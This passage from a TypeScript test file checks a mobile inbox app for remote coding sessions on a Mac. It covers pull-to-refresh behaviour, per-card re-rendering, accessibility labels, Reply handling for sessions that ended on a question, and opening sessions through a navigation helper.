      await fireEvent.press(screen.getByRole("button", { name: /^b\?x=1, / }));
      expect(view.getSegments()).toEqual(["session", "[id]"]);
      expect(screen.getByTestId("opened").children).toEqual([k("a/../b?x=1")]);
    });
  });

  describe("pull to refresh", () => {
    const list = () => screen.getByTestId("inbox-list");

    it("on a live link keeps it: no new hello, no offline flash", async () => {
      const rig = await launch([info("a")]);
      const first = rig.sockets.last;
      const states: string[] = [];
      const off = octetStore.subscribe((s) => states.push(bestHub(s)));
      await act(async () => {
        list().props.refreshControl.props.onRefresh();
      });
      off();
      expect(first.closed).toBe(false);
      expect(rig.sockets.all).toHaveLength(1);
      expect(states.filter((s) => s !== "ready")).toEqual([]);
      expect(list().props.refreshControl.props.refreshing).toBe(true);
    });

    it("on a live link ends with the next sessions frame, or after 1 s", async () => {
      const rig = await launch([info("a")]);
      await act(async () => {
        list().props.refreshControl.props.onRefresh();
      });
      await wait(999);
      expect(list().props.refreshControl.props.refreshing).toBe(true);
      await wait(1);
      expect(list().props.refreshControl.props.refreshing).toBe(false);
      await act(async () => {
        list().props.refreshControl.props.onRefresh();
      });
      await hear(rig, [info("a"), info("b")]);
      expect(list().props.refreshControl.props.refreshing).toBe(false);
    });

    it("while the Mac can't be reached tries again now, and stops once it answers", async () => {
      const rig = await launch([info("a")]);
      await act(async () => {
        rig.sockets.last.drop();
      });
      const before = rig.sockets.all.length;
      await act(async () => {
        list().props.refreshControl.props.onRefresh();
      });
      expect(rig.sockets.all).toHaveLength(before + 1);
      expect(list().props.refreshControl.props.refreshing).toBe(true);
      await act(async () => {
        rig.sockets.last.open();
        rig.sockets.last.receive({ type: "welcome", device: "iPhone" });
        rig.clock.advance(50);
      });
      expect(list().props.refreshControl.props.refreshing).toBe(false);
      await act(async () => {
        rig.sockets.last.drop();
      });
      expect(list().props.refreshControl.props.refreshing).toBe(false);
    });
  });

  it("re-renders only the card whose own data changed", async () => {
    const rig = await launch([info("a"), info("b"), info("c")]);
    await fireEvent.press(tab("Done"));
    const drawn = jest.spyOn(inboxWords, "cardLabel");
    await hear(rig, [info("a"), info("b", { goal: "New goal" }), info("c")]);
    expect(inCard("b").getByText("New goal")).toBeTruthy();
    expect(drawn).toHaveBeenCalledTimes(1);
    drawn.mockClear();
    await hear(rig, [info("a"), info("b", { goal: "New goal" }), info("c")]);
    expect(drawn).not.toHaveBeenCalled();
  });

  it("clips each part of a card's label, and shows the text whole", async () => {
    const goal = "g".repeat(500);
    await launch([info("a", { goal })]);
    await fireEvent.press(tab("Done"));
    const open = inCard("a").getByRole("button", { name: /^a, / });
    const parts = String(open.props.accessibilityLabel).split(", ");
    expect(parts.every((p) => p.length <= 120)).toBe(true);
    expect(inCard("a").getByText(goal)).toBeTruthy();
  });

  describe("a session that ended on a question", () => {
    const asking = (id: string, extra: Partial<SessionInfo> = {}) => info(id, { question: true, ...extra });

    it("is a card in Needs you: ● question, 'Ended on a question' and a Reply button, and no Allow, Deny or Review", async () => {
      await launch([asking("a")]);
      expect(screen.getByRole("tab", { name: "Needs you 1" })).toBeTruthy();
      const c = inCard("a");
      expect(c.getByText("● question")).toBeTruthy();
      expect(c.getByText("Ended on a question")).toBeTruthy();
      expect(c.getByRole("button", { name: "Reply to a" })).toBeTruthy();
      expect(c.queryByRole("button", { name: /^Allow once/ })).toBeNull();
      expect(c.queryByRole("button", { name: /^Deny/ })).toBeNull();
      expect(c.queryByRole("button", { name: /^Review/ })).toBeNull();
      expect([dark.amber, light.amber]).toContain(style(c.getByText("● question")).color);
    });

    it("is not in Running or Done", async () => {
      await launch([asking("a"), info("b")]);
      await fireEvent.press(tab("Done"));
      expect(screen.queryByTestId(`inbox-card-${k("a")}`)).toBeNull();
      expect(screen.getByTestId(`inbox-card-${k("b")}`)).toBeTruthy();
    });

    it("Reply opens the conversation and asks for its prompt to be focused", async () => {
      const rig = await launch([asking("a")]);
      expect(octetStore.getState().replyTo).toBeNull();
      await fireEvent.press(inCard("a").getByRole("button", { name: "Reply to a" }));
      expect(rig.view.getPathname()).toBe(`/session/${k("a")}`);
      expect(octetStore.getState().replyTo).toBe(k("a"));
      expect(answers(rig)).toEqual([]);
    });

    it("tapping the card itself opens the conversation without asking for the prompt", async () => {
      const rig = await launch([asking("a")]);
      octetStore.getState().setReplyTo("zzz");
      await fireEvent.press(inCard("a").getByRole("button", { name: /^a, / }));
      expect(rig.view.getPathname()).toBe(`/session/${k("a")}`);
      expect(octetStore.getState().replyTo).toBeNull();
    });

    it("Reply does nothing while the Mac can't be reached", async () => {
      const rig = await launch([asking("a")]);
      await act(async () => {
        rig.sockets.last.drop();
      });
      const reply = inCard("a").getByRole("button", { name: "Reply to a" });
      expect(disabled(reply)).toBe(true);
      await fireEvent.press(reply);
      expect(rig.view.getPathname()).toBe("/");
    });

    it("has a 44-point Reply button", async () => {
      await launch([asking("a")]);
      expect(Number(style(inCard("a").getByRole("button", { name: "Reply to a" })).minHeight)).toBeGreaterThanOrEqual(44);
    });

    it("leaves Allow all to the approvals", async () => {
      await launch([waiting("a", gist(1)), waiting("b", gist(2)), asking("c")]);
      await wait(400);
      expect(screen.getByRole("button", { name: "Allow all 2 once" })).toBeTruthy();
    });

    it("goes when the Mac's row stops saying question", async () => {
      const rig = await launch([asking("a")]);
      await hear(rig, [info("a")]);
      expect(screen.queryByTestId(`inbox-card-${k("a")}`)).toBeNull();
    });
  });

  describe("opening a session from a card", () => {
    it("goes through openSession, so a conversation already in the stack is not opened twice", async () => {
      const open = jest.spyOn(navigation, "openSession");
      const rig = await launch([info("a")]);
      await fireEvent.press(tab("Done"));
      await fireEvent.press(inCard("a").getByRole("button", { name: /^a, / }));
      expect(open).toHaveBeenCalledTimes(1);
      expect(open.mock.calls[0]?.[2]).toBe("/");
      expect(open.mock.calls[0]?.[3]).toBe(k("a"));
      expect(rig.view.getPathname()).toBe(`/session/${k("a")}`);
    });

    it("Review goes through it too", async () => {
      const open = jest.spyOn(navigation, "openSession");
      await launch([waiting("a", gist(1, { action: "Edit", command: null, files: ["x.rs"] }))]);
      await fireEvent.press(inCard("a").getByRole("button", { name: "Review a" }));
      expect(open).toHaveBeenCalledWith(expect.anything(), expect.anything(), "/", k("a"));
    });
  });
});
